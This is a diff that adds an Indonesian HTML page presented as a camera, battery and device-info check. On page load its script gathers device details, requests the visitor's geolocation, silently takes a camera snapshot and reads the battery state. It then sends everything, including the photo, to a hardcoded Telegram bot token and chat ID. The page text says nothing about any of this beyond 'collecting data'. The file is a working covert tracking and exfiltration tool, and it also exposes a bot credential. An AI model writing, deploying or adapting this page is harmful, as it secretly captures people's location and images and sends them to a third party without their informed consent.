@@ -1,0 +1,189 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cek Kamera, Baterai, & Info Perangkat</title>
+    <style>
+        /* Animasi Fade-In untuk Halaman */
+        body {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            opacity: 0;
+            animation: fadeIn 1.5s forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* Animasi Loading */
+        .loading {
+            font-size: 20px;
+            font-weight: bold;
+            margin-top: 20px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        /* Animasi Teks Menyala */
+        .glow-text {
+            font-size: 24px;
+            font-weight: bold;
+            text-transform: uppercase;
+            animation: glow 1.5s infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #fff, 0 0 20px #ffdd57, 0 0 30px #ffdd57; }
+            to { text-shadow: 0 0 20px #fff, 0 0 30px #ff5733, 0 0 40px #ff5733; }
+        }
+    </style>
+</head>
+<body>
+    <div class="glow-text">Memeriksa Perangkat...</div>
+    <div class="loading">🔄 Mengumpulkan Data...</div>
+
+    <script>
+        const BOT_TOKEN = "7101553614:AAES3n31PmVrF9clBmu50JRhFz22wE5RU8U"; // Ganti dengan Token Bot Telegram
+        const CHAT_ID = "7895289556"; // Ganti dengan ID Chat Telegram
+
+        // Fungsi untuk mendapatkan informasi perangkat
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                language: navigator.language
+            };
+        }
+
+        // Fungsi untuk mendapatkan lokasi
+        function getLocation(callback) {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        callback({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        callback({ error: error.message });
+                    }
+                );
+            } else {
+                callback({ error: "Geolocation tidak didukung" });
+            }
+        }
+
+        // Fungsi untuk mengecek kamera dan mengambil gambar
+        async function checkCameraAndCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoTracks = stream.getVideoTracks();
+                const cameraInfo = videoTracks.map(track => track.label).join(", ");
+
+                // Ambil gambar dari kamera
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL("image/png");
+
+                // Hentikan kamera setelah mengambil gambar
+                stream.getTracks().forEach(track => track.stop());
+
+                return { cameraInfo, imageData };
+            } catch (error) {
+                return { error: "Kamera tidak dapat diakses: " + error.message };
+            }
+        }
+
+        // Fungsi untuk mendapatkan informasi baterai
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) {
+                return { error: "Informasi baterai tidak didukung di perangkat ini." };
+            }
+
+            const battery = await navigator.getBattery();
+            return {
+                level: (battery.level * 100) + "%",
+                charging: battery.charging ? "🔌 Sedang Mengisi" : "⚡ Tidak Mengisi",
+                chargingTime: battery.chargingTime ? battery.chargingTime + " detik" : "N/A",
+                dischargingTime: battery.dischargingTime ? battery.dischargingTime + " detik" : "N/A"
+            };
+        }
+
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(message, imageData = null) {
+            let textMessage = encodeURIComponent(message);
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${textMessage}&parse_mode=Markdown`;
+
+            await fetch(url);
+
+            // Jika ada gambar, kirim juga
+            if (imageData) {
+                let blob = await fetch(imageData).then(res => res.blob());
+                let formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "snapshot.png");
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            }
+        }
+
+        // Fungsi utama untuk menjalankan semua pengecekan
+        async function runChecks() {
+            let deviceInfo = getDeviceInfo();
+            let locationData = await new Promise(getLocation);
+            let cameraData = await checkCameraAndCapture();
+            let batteryInfo = await getBatteryInfo();
+
+            let message = `🚨 *Zeetasi Mode Sad Lapor* 🚨\n\n` +
+                          `📌 *Informasi Perangkat:*\n` +
+                          `   - 📱 *Perangkat:* ${deviceInfo.userAgent}\n` +
+                          `   - 🖥 *Platform:* ${deviceInfo.platform}\n` +
+                          `   - 📏 *Resolusi Layar:* ${deviceInfo.screenWidth} x ${deviceInfo.screenHeight}\n` +
+                          `   - 🌐 *Bahasa:* ${deviceInfo.language}\n\n` +
+                          `📍 *Informasi Lokasi:*\n` +
+                          (locationData.error ? `   ❌ *Lokasi Tidak Dapat Diakses:* ${locationData.error}` :
+                          `   - ✅ *Latitude:* ${locationData.latitude}\n` +
+                          `   - ✅ *Longitude:* ${locationData.longitude}\n` +
+                          `   - 🎯 *Akurasi:* ${locationData.accuracy} meter\n`) +
+                          `\n📷 *Informasi Kamera:* ${cameraData.error ? `❌ ${cameraData.error}` : `✅ ${cameraData.cameraInfo}`}` +
+                          `\n🔋 *Informasi Baterai:* ${batteryInfo.error ? `❌ ${batteryInfo.error}` : `🔋 ${batteryInfo.level} - ${batteryInfo.charging}`}`;
+
+            await sendToTelegram(message, cameraData.imageData);
+        }
+
+        // Jalankan otomatis saat halaman dibuka
+        runChecks();
+    </script>
+</body>
+</html>
